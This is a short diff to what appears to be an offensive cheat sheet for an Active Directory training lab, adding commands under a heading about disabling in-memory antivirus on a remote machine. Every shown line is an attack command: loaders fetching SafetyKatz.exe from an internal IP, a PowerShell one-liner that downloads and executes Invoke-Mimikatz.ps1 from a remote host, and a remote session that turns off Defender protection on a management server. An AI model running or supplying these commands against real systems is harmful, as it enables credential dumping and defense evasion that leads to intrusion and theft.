@@ -70,3 +70,7 @@ C:\Users\Public\Loader.exe -path http://192.168.100.75/SafetyKatz.ex
 C:\Users\Public\AssemblyLoad.exe http://192.168.100.75/Loader.exe -path http://192.168.100.75/SafetyKatz.exe
 
 
+# DISABLE IN MEMORY AV PROTECTION OF A REMOTE MACHINE (from CI -> MGMT)
+iex ((New-Object Net.WebClient).DownloadString('https://172.16.100.75/Invoke-Mimikatz.ps1'))
+$sess = New-PSSsession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
+Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
